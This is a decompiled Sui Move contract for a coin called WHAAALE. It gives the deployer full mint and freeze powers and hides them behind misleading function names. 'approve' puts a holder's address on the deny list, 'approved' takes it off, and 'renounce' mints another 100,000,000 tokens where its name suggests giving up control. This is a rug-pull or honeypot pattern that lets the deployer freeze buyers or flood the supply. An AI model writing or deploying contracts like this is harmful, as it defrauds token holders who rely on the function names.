module 0x28b4fb7385abaf843165a67cc4a1e28fe6b7137b64dfe68c03b3ac2fdd5542df::whaaale {
    struct WHAAALE has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WHAAALE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WHAAALE>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WHAAALE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WHAAALE>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: WHAAALE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WHAAALE>(arg0, 2, b"WHAAALE", b"WHAAALE", b"just and WHAAALE", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://suitools.io/whaaale.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WHAAALE>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<WHAAALE>(&mut v3, 100000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<WHAAALE>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WHAAALE>>(v1, v4);
    }

    public entry fun renounce(arg0: &mut 0x2::coin::TreasuryCap<WHAAALE>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<WHAAALE>(arg0, 100000000, arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

